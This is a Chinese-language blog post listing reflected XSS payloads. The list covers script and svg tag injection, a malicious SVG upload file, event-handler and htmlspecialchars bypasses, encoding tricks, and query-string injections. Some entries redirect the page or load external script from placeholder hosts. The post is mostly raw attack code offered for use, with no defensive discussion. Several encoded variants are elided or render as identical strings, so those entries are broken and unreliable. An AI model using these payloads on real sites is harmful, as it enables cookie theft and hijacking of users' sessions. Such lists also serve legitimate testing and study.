<!doctype html><html class=no-js lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>常见的反射型XSS攻击方法 - 臭大佬博客</title><script>(function(e,t){e[t]=e[t].replace("no-js","js")})(document.documentElement,"className")</script><meta name=description content="常见的反射型XSS攻击方法"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=dns-prefetch href=//fonts.googleapis.com><link rel=dns-prefetch href=//fonts.gstatic.com><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/favicon.ico></head><body class=body><div class="container container--outer"><header class=header><div class="container header__container"><div class=logo><a class=logo__link href=/ title=臭大佬博客 rel=home><div class="logo__item logo__text"><div class=logo__title>臭大佬博客</div></div></a></div><nav class=menu><button class=menu__btn aria-haspopup=true aria-expanded=false tabindex=0>
<span class=menu__btn-title tabindex=-1>菜单</span></button><ul class=menu__list><li class=menu__item><a class=menu__link href=/><span class=menu__text>首页</span></a></li><li class=menu__item><a class=menu__link href=/post/><span class=menu__text>归档</span></a></li><li class=menu__item><a class=menu__link href=/about/><span class=menu__text>关于</span></a></li></ul></nav></div></header><div class="wrapper flex"><div class=primary><main class=main role=main><article class=post><header class=post__header><h1 class=post__title>常见的反射型XSS攻击方法</h1></header><div class="content post__content clearfix"><h1 id=常见的反射型xss攻击方法>常见的反射型XSS攻击方法</h1><h3 id=普通的xss-javascript注入>普通的XSS JavaScript注入</h3><h5 id=input输入合并标签>input输入合并标签</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>c</span><span style=color:#e6db74>&#34;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</span></span></span></code></pre></div><h5 id=文本框输入>文本框输入</h5><h6 id=基础测试>基础测试</h6><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h6 id=区分大小写>区分大小写</h6><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>sCRipT</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>sCrIPt</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h6 id=svg标签>svg标签</h6><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>svg</span><span style=color:#f92672>/</span><span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=svg文件>svg文件</h5><p>建个11.svg文件，用于上传，内容如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>svg</span> <span style=color:#a6e22e>xmlns</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.w3.org/2000/svg&#34;</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;alert(document.domain)&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span></code></pre></div><p>或者</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>svg</span> <span style=color:#a6e22e>xmlns</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.w3.org/2000/svg&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;&lt;/</span><span style=color:#a6e22e>svg</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p>11.svg文件，标准内容如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>xml</span> <span style=color:#a6e22e>version</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.0&#34;</span> <span style=color:#a6e22e>standalone</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;no&#34;</span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;&lt;svg t=&#34;1629902091639&#34; class=&#34;icon&#34; viewBox=&#34;0 0 1024 1024&#34; version=&#34;1.1&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;  onload=&#34;alert(document.domain)&#34; p-id=&#34;3724&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; width=&#34;200&#34; height=&#34;200&#34;&gt;&lt;defs&gt;&lt;style type=&#34;text/css&#34;&gt;&lt;/style&gt;&lt;/defs&gt;&lt;path d=&#34;M738.781457 243.320134c28.197694-5.199575 52.595699 13.998855 54.695527 15.598725 28.197694 22.798136 30.297523 60.995013 31.297441 78.093614 0.399967 7.999346 0.299975 16.098684-0.299975 24.298014 2.999755-5.199575 5.799526-10.499142 8.199329-15.8987 6.999428-15.798708 31.897392-79.293516 79.093533-87.892814 12.998937-2.399804 25.19794-0.199984 35.397106 3.399722-0.699943-1.199902-1.299894-2.399804-1.999837-3.599705-17.898536-29.997547-41.196631-49.695936-49.495953-56.595373-32.997302-27.497752-46.796174-23.698062-70.694219-49.495953-21.898209-23.59807-31.397433-49.295969-35.397106-63.694791-10.599133-37.896901-4.099665-69.994277 0-84.893059-12.199003-2.399804-42.996484-6.899436-77.793639 7.09942C680.886191 22.038228 662.687679 42.336568 654.988308 52.235759c22.49816 24.09803 38.496852 46.496198 49.495953 63.694792 19.798381 30.997465 25.597907 48.496035 28.297686 63.694791 2.499796 13.898864 4.499632 24.09803 0 35.397106-4.599624 11.399068-14.598806 21.498242-28.297686 35.397106-5.799526 5.799526-11.999019 11.599052-14.098847 21.198266-0.799935 3.599706-0.899926 6.799444-0.699943 9.29924 11.599052-17.198594 27.797727-33.697245 49.095986-37.596926z&#34; fill=&#34;#C0CA33&#34; p-id=&#34;3725&#34;&gt;&lt;/path&gt;&lt;path d=&#34;M732.781947 59.335178l56.595373-56.595372c-12.199003-2.399804-42.996484-6.899436-77.793639 7.099419-26.697817 10.699125-43.896411 27.39776-52.995667 38.096885l74.193933 11.399068z&#34; fill=&#34;#827717&#34; p-id=&#34;3726&#34;&gt;&lt;/path&gt;&lt;path d=&#34;M973.362276 370.609726c-0.999918-28.49767-2.899763-68.494399-26.29785-109.591039-10.099174-3.599706-22.398169-5.799526-35.397106-3.399722-47.196141 8.699289-72.194097 72.094105-79.093533 87.892813-2.399804 5.399558-5.199575 10.699125-8.199329 15.8987C814.975226 483.600487 692.985201 621.989171 660.687842 657.386277c-31.997384 35.09713-83.293189 90.792576-164.086583 148.487859-118.690295 84.693075-235.280762 126.989616-359.370615 171.885945-6.499469 2.299812-15.998692 8.299321-27.097784 15.098765l0.199983 0.299976v21.298258c12.898945 4.299648 25.497915 5.999509 35.397106 6.999428 82.393263 8.299321 158.787016-6.299485 162.686698-7.09942 56.495381-11.199084 108.891096-21.598234 176.885536-49.495952 112.190826-46.196223 185.184858-106.791268 226.381489-141.488431 75.193852-63.494808 122.290001-122.989943 141.488431-148.587851 33.697245-44.696345 72.794048-97.59202 98.991906-176.885536 22.198185-67.194506 21.698226-112.590794 21.198267-127.289592z&#34; fill=&#34;#FFCA28&#34; p-id=&#34;3727&#34;&gt;&lt;/path&gt;&lt;path d=&#34;M824.774425 337.112465c-0.899926-17.098602-2.999755-55.39547-31.297441-78.093614-2.099828-1.699861-26.497833-20.798299-54.695527-15.598725-21.298258 3.899681-37.496934 20.398332-49.095986 37.496934 0.199984 2.499796 0.599951 4.299648 0.699943 4.799608 1.699861 8.299321 0 84.493091-70.69422 183.884964-31.397433 44.096394-66.394571 78.793557-98.69193 105.591366-38.196877 31.7974-72.594064 52.495708-92.292453 64.194751-31.497425 18.598479-41.496607 21.198267-97.792004 48.496034-23.59807 11.49906-55.295479 27.297768-100.291799 50.495871-14.198839 7.299403-62.094923 32.497343-113.190745 77.793639-27.497752 24.398005-54.395552 53.295642-63.694792 91.992478-0.699943 2.999755-1.299894 5.899518-1.699861 8.599297-1.399886 8.599297-1.599869 15.998692-1.299894 22.198185l51.795765 39.896738 7.699371 13.898864c11.099092-6.799444 20.598316-12.798953 27.097784-15.098766 124.089853-44.896329 240.780312-87.19287 359.370615-171.885945 80.793394-57.695282 132.089199-113.290736 164.086583-148.487859C692.985201 621.989171 814.975226 483.600487 824.374458 361.410478c0.699943-8.19933 0.799935-16.298667 0.399967-24.298013z&#34; fill=&#34;#FFE082&#34; p-id=&#34;3728&#34;&gt;&lt;/path&gt;&lt;path d=&#34;M110.13286 992.858846l-7.699371-13.898863-51.795765-39.896738c0.999918 6.199493 1.999836 12.498978 2.999755 18.698471v7.09942c4.699616 7.099419 9.399231 14.098847 14.098847 21.198266l7.09942 7.09942c4.899599 3.899681 9.799199 7.799362 14.79879 11.699043 2.19982 0.799935 4.299648 1.599869 6.499468 2.399804l14.098848 7.199411c0-7.199411-0.099992-14.398823-0.099992-21.598234z&#34; fill=&#34;#5D4037&#34; p-id=&#34;3729&#34;&gt;&lt;/path&gt;&lt;img src = &#34;javascript:alert(&#39;1&#39;);&#34;&gt;&lt;/img&gt;&lt;/svg&gt;
</span></span></span></code></pre></div><h5 id=重定向>重定向</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>window</span><span style=color:#f92672>.</span><span style=color:#a6e22e>location</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.baidu.com&#34;</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>iframe</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;http://127.0.0.1/a.jpg&#39;</span> <span style=color:#a6e22e>height</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#a6e22e>width</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0&#39;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>iframe</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;http://127.0.0.1/a.js&#39;</span><span style=color:#f92672>&gt;&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h6 id=htmlspecialchars绕过>htmlspecialchars绕过</h6><p>//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&rsquo;处理，输入的内容被处理后输出到了input标签的value属性里面,试试:&lsquo;onclick=&lsquo;alert(1)&rsquo;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#e6db74>&#39; onclick=&#39;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span></code></pre></div><h6 id=字符编码>字符编码</h6><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>“xss”</span>);<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>可以转换为：</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>%</span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>c</span><span style=color:#f92672>%</span><span style=color:#ae81ff>73</span><span style=color:#f92672>%</span><span style=color:#ae81ff>63</span><span style=color:#f92672>%</span><span style=color:#ae81ff>72</span><span style=color:#f92672>%</span><span style=color:#ae81ff>69</span><span style=color:#f92672>%</span><span style=color:#ae81ff>70</span><span style=color:#f92672>%</span><span style=color:#ae81ff>74</span><span style=color:#f92672>%</span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>e</span><span style=color:#f92672>%</span><span style=color:#ae81ff>61</span><span style=color:#f92672>%</span><span style=color:#ae81ff>6</span><span style=color:#a6e22e>c</span><span style=color:#f92672>%</span><span style=color:#ae81ff>65</span><span style=color:#f92672>%</span><span style=color:#ae81ff>72</span><span style=color:#f92672>%</span><span style=color:#ae81ff>74</span><span style=color:#f92672>%</span><span style=color:#ae81ff>28</span><span style=color:#f92672>%</span><span style=color:#ae81ff>22</span><span style=color:#f92672>%</span><span style=color:#ae81ff>78</span><span style=color:#f92672>%</span><span style=color:#ae81ff>73</span><span style=color:#f92672>%</span><span style=color:#ae81ff>73</span><span style=color:#f92672>%</span><span style=color:#ae81ff>22</span><span style=color:#f92672>%</span><span style=color:#ae81ff>29</span><span style=color:#f92672>%</span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>b</span><span style=color:#f92672>%</span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>c</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#a6e22e>f</span><span style=color:#f92672>%</span><span style=color:#ae81ff>73</span><span style=color:#f92672>%</span><span style=color:#ae81ff>63</span><span style=color:#f92672>%</span><span style=color:#ae81ff>72</span><span style=color:#f92672>%</span><span style=color:#ae81ff>69</span><span style=color:#f92672>%</span><span style=color:#ae81ff>70</span><span style=color:#f92672>%</span><span style=color:#ae81ff>74</span><span style=color:#f92672>%</span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>e</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 使用eval
</span></span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\61\6</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\65</span><span style=color:#e6db74>......&#34;</span>);<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h6 id=空格回车tab>空格/回车/Tab</h6><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;javascript:　alert(/1/);&#34;</span> <span style=color:#a6e22e>width</span><span style=color:#f92672>=</span><span style=color:#ae81ff>100</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h6 id=利用html标签属性值执行xss>利用HTML标签属性值执行XSS</h6><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;javascript:alert(&#39;1&#39;);&#34;</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h6 id=事件执行>事件执行</h6><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>);<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>input</span> <span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;button&#34;</span>  <span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;clickme&#34;</span> <span style=color:#a6e22e>οnclick</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;alert(&#39;click me&#39;)&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span></code></pre></div><h5 id=浏览器请求参数必须有这个参数名请求类型要相同>浏览器请求参数（必须有这个参数名，请求类型要相同）</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>xxx</span><span style=color:#f92672>?</span><span style=color:#a6e22e>method</span><span style=color:#f92672>=&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>);<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#a6e22e>name</span><span style=color:#f92672>=&lt;</span><span style=color:#a6e22e>img</span><span style=color:#f92672>%</span><span style=color:#ae81ff>20</span><span style=color:#a6e22e>src</span><span style=color:#f92672>%</span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>D1</span><span style=color:#f92672>%</span><span style=color:#ae81ff>20</span><span style=color:#a6e22e>onerror</span><span style=color:#f92672>%</span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>Dalert</span><span style=color:#f92672>%</span><span style=color:#ae81ff>281</span><span style=color:#f92672>%</span><span style=color:#ae81ff>29</span><span style=color:#f92672>%</span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>B</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span> <span style=color:#f92672>=%</span><span style=color:#ae81ff>22</span>;<span style=color:#a6e22e>alert</span><span style=color:#f92672>%</span><span style=color:#ae81ff>281</span><span style=color:#f92672>%</span><span style=color:#ae81ff>29</span>;<span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#a6e22e>f</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#a6e22e>f</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#a6e22e>name</span><span style=color:#f92672>=&lt;</span><span style=color:#a6e22e>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ISO-2022-JP&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>%</span><span style=color:#ae81ff>1</span><span style=color:#a6e22e>B28B</span><span style=color:#f92672>=</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>) <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>x</span><span style=color:#f92672>=</span><span style=color:#a6e22e>payload1</span><span style=color:#e6db74>&#34;&gt;&lt;svg&gt;&lt;script&gt;alert%26%23x28;1%26%23x29&lt;/script&gt;&lt;/svg&gt;
</span></span></span></code></pre></div><h5 id=img标签xss使用javascript命令>IMG标签XSS使用JavaScript命令</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>xxx</span><span style=color:#f92672>/</span><span style=color:#a6e22e>XSS</span><span style=color:#f92672>/</span><span style=color:#a6e22e>xss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>js</span><span style=color:#f92672>/&gt;</span>
</span></span></code></pre></div><h5 id=img标签无分号无引号>IMG标签无分号无引号</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=img标签大小写不敏感>IMG标签大小写不敏感</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#a6e22e>JaVaScRiPt</span><span style=color:#f92672>:</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=html编码必须有分号>HTML编码(必须有分号)</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=修正缺陷img标签>修正缺陷IMG标签</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#e6db74>&#34;&#34;&#34;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;&#34;</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=formcharcode标签计算器>formCharCode标签(计算器)</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span><span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>String</span><span style=color:#f92672>.</span><span style=color:#a6e22e>fromCharCode</span>(<span style=color:#ae81ff>88</span>,<span style=color:#ae81ff>83</span>,<span style=color:#ae81ff>83</span>))<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=utf-8的unicode编码计算器>UTF-8的Unicode编码(计算器)</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#a6e22e>jav</span><span style=color:#f92672>..</span><span style=color:#a6e22e>省略</span><span style=color:#f92672>..</span><span style=color:#a6e22e>S</span><span style=color:#960050;background-color:#1e0010>&#39;</span>)<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=7位的utf-8的unicode编码是没有分号的计算器>7位的UTF-8的Unicode编码是没有分号的(计算器)</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#a6e22e>jav</span><span style=color:#f92672>..</span><span style=color:#a6e22e>省略</span><span style=color:#f92672>..</span><span style=color:#a6e22e>S</span><span style=color:#960050;background-color:#1e0010>&#39;</span>)<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=十六进制编码也是没有分号计算器>十六进制编码也是没有分号(计算器)</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=&amp;</span><span style=color:#75715e>#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
</span></span></span></code></pre></div><h5 id=嵌入式标签将javascript分开>嵌入式标签,将Javascript分开</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;jav ascript:alert(1);&#34;</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=嵌入式编码标签将javascript分开>嵌入式编码标签,将Javascript分开</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;jav ascript:alert(1);&#34;</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=嵌入式换行符>嵌入式换行符</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;jav ascript:alert(1);&#34;</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=嵌入式回车>嵌入式回车</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;jav ascript:alert(1);&#34;</span><span style=color:#f92672>&gt;</span>
